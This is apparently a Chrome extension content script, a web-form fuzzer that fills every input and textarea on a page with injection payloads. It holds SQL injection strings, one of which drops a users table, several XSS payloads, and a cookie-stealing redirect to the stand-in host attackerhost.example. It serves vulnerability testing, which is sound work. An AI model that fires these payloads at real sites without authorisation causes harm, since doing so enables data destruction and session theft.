$(document).ready(function() {
  var attacks = [[],[],[]];

  chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
    if (request.type == 1 || request.type == 2) {
      sendResponse({acknowledged: "Mission accepted."});
      inject(request.type, request.attack);
    } else {
      sendResponse({acknowledged: "Mission denied."});
    }
  });

  function inject(type, attack) {
    var attack = attacks[type][attack];
    var inputs  = document.getElementsByTagName('input');
    var textareas = document.getElementsByTagName('textarea');

    for (i in inputs) {
      var input = inputs[i];
      var injection;
      
      if (input.type === 'password') {
        injection = attack('password_field');
      } else {
        injection = attack(input.name);
      }

      if (input.type === 'email') { 
        input.type = 'text';
      }

      if (input.type === 'checkbox') {
        input.checked = 'checked';
      }

      if (input.type === 'radio') {
        input.checked = 'checked';
      }

      input.value = injection;
      console.log(input.value);
    }

    for (t in textareas) {
      var textarea = textareas[t];
      injection = attack(textarea.name);
      textarea.value = injection;
      console.log(textarea.value);
    }
  }

  /* Basic SQL */
  var sql_debug = function(name) {
    return "CREATE TABLE sql_vuln IF NOT EXISTS (field VARCHAR); INSERT INTO sql_vuln VALUES('"+name+"');"; 
  }

  var js_debug = function(name) {
    return "<p style='color:red;font-weight:bold;' class='vulnerable_input_found'>"+name+" is vulnerable to XSS attacks.</p>";
  }

  attacks[1][0] = function(name) {
    return "' or '1'='1' -- '" + sql_debug(name);
  }

  attacks[1][1] = function(name) {
    return "a';DROP TABLE users;" + sql_debug(name);
  }

  attacks[1][2] = function(name) {
    return "a’;SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
  }

  /* Basic XSS */
  attacks[2][0] = function(name) {
    return "<script>alert('"+name+" is vulnerable to XSS.');</script>";
  }

  /* Style XSS Attack */
  attacks[2][1] = function(name) {
    return "@import\"javascript:alert('"+name+" is vulnerable to a style attack.')\";"
  }
  
  /* Attribute attack */
  attacks[2][2] = function(name) {
    return "\"><script>alert('"+name+" is vulnerable to an attribute attack.');</script>";
  }

  /* Redirect cookie steal */
  attacks[2][3] = function(name) {
    return "<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>";
  }

  /* src/href attack */
  attacks[2][4] = function(name) {
    return "javascript:alert('XSS')"
  }
});
